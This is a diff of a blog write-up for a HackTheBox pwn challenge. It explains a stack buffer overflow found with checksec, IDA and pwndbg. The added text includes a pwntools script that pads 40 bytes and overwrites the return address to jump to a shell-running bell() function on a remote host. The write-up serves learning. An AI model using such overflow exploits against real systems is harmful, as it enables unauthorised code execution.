@@ -9,7 +9,7 @@ event: "HackTheBox"
 featured: false
 ---
 
-## Overview
+## Information Gathering
 
 This was the first binary exploitation (pwn) I ever did, which I studied on the spot, but it's a good thing I have the fundamentals of x86 assembly fairly solidified. 
 
@@ -28,7 +28,9 @@ rei@DESKTOP-81ACF50:~/ctf/RINg the bell$ pixi run checksec ring_the_bell
     Stripped:   No
 ```
 
-This tells us a few things. A disabled stack canary means buffer overflows are possible, and no PIE means no memory randomization (ASLR) basically. I haven't tackled these concepts on my low-level studying yet so all of these descriptions are high-level.
+This tells us a few things. A disabled stack canary means buffer overflows are possible, and no PIE means no memory randomization (ASLR) basically. I haven't tackled these concepts on my low-level studying yet so all of these descriptions are high-level. 
+
+Since this is a pwn challenge, I did not use and do my recon tools like `strings` since this obviously involves a basic form of binary exploitation.
 
 ## Static Analysis With IDA 
 
@@ -48,7 +50,7 @@ We immediately go to the `main` function and inspect the decompilation:
 
 The line `_QWORD buf[4];` and the line `read(0, buf, 0x60u);` is already a huge hint. We have just allocated 32 bytes of buffer, but we can `read` 96 bytes. That means we are able to put bytes beyond what the buffer can hold, which means we can overwrite what is written in memory beyond that. This specific line also means:
 
-> Read from standard input (`stdin`), put it into the buffer, and can read 0x60 bytes (96 bytes)
+> Read from standard input (`stdin`), put it into the buffer, and can read 0x60 bytes (96 bytes).
 
 The decompilation of the main function does not provide any more useful information other than this. The next step would be to look at other defined functions. There are a few, but one function's contents stands out:
 
@@ -98,4 +100,45 @@ Dump of assembler code for function main:
 ```
 
 This is the disassembly for main. We break at the instruction `lea    rax,[rip+0xdea]` just after the `call` instruction to `read` because that is the time when we need to input something and it gets allocated into a 32-byte buffer. 
+
+```assembly
+pwndbg> x/10xg $rsp
+0x7fffffffda50: 0x0000000000000a61      0x0000000000000000
+0x7fffffffda60: 0x0000000000000000      0x0000000000000000
+0x7fffffffda70: 0x00007fffffffdb20      0x00007ffff7c2a601
+0x7fffffffda80: 0x00007fffffffdb60      0x00007fffffffdba8
+0x7fffffffda90: 0x00000001ffffdba8      0x000000000040179b
+```
+
+I just tested typing one single character "a" (`0x61`) after the input. As you can see, we can see a lot of zeros. The line `memset(buf, 0, sizeof(buf));` zeroed out this specific buffer zone, and we can see it is exactly 32 bytes. The next series of 8 byte after that buffer is just the saved RBP. The next 8 bytes after that: `0x00007ffff7c2a601` Is the return address after main finishes. 
+
+This means we need to pad 40 bytes of junk (32 bytes of buffer + 8 bytes for the saved RBP), and then the next 8 bytes should be the address of the `bell()` function which we overwrite the return address. So that when we hit these instructions:
+
+```assembly
+   0x0000000000401828 <+141>:   leave
+   0x0000000000401829 <+142>:   ret
+```
+
+`ret` pops the return address off the stack, and jumps back to that location. If we overwrite our return address with the address of the `bell()` function, we are going to jump inside that function and execute the shell command.
+
+## Scripting and Privilege Escalation
+
+Using pwntools, this is the script that I used to craft the exploit.
+
+```python
+from pwn import *
+
+p = remote('<IP-ADDRESS>', PORT-NUM)
+padding = b'A' * 40
+
+target_address = p64(0x40176d)
+
+payload = padding + target_address
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+
 
